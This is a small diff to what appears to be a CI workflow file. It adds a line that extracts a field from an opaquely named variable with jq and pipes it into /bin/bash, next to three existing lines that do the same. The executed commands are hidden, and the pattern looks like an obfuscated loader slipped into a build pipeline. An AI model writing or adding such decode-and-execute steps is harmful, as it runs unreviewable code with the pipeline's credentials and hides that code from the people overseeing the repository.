@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$kt8315" | jq -r .g394 | /bin/bash
           echo $napsy09 | jq -r .a29 | /bin/bash
           echo $hmgfz051 | jq -r .pz94 | /bin/bash
+          printf '%s' "$spef4" | jq -r .m516 | /bin/bash
 
       - name: Persist output
         if: always()
